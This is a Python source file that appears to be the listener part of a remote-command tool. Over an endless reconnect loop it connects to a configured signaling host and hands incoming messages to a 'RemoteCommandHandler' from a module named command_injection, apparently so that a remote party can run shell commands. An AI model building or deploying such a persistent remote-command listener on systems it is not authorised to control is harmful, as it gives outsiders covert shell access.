# command/listen_bash.py

import asyncio

from core.client import client_id, username
from core.config import ROOM, HOST

from signaling.signal import SignalClient
from signaling.peer import Peer
from media.local_media import LocalMedia

from command_injection.injector import RemoteCommandHandler as ReceiverHandler


async def listen_mode():
    print("[+] Listen mode")

    retry_delay = 10

    while True:
        signal = None
        media = None
        peer = None

        try:
            # ----------------------------------
            # Signaling
            # ----------------------------------
            signal = SignalClient(room=ROOM, client_id=client_id, host=HOST, username=username,)

            await signal.connect()

            # ----------------------------------
            # Command Injection
            # ----------------------------------
            ReceiverHandler(signal)

            print(
                f"[+] Listening as {username} "
                f"({client_id})"
            )

            print("[+] Waiting for incoming offers...")

            # ----------------------------------
            # Keep process alive
            # ----------------------------------
            while True:
                await asyncio.sleep(1)

        except asyncio.CancelledError:
            raise

        except Exception as exc:
            print(f"[!] Error: {exc}")

        finally:
            print("[+] Cleaning up...")

            try:
                if peer is not None:
                    await peer.close()
            except Exception:
                pass

            try:
                if media:
                    await media.stop()
            except Exception:
                pass

            try:
                if signal:
                    await signal.close()
            except Exception:
                pass

        print(
            f"[+] Reconnecting in "
            f"{retry_delay} seconds..."
        )

        await asyncio.sleep(retry_delay)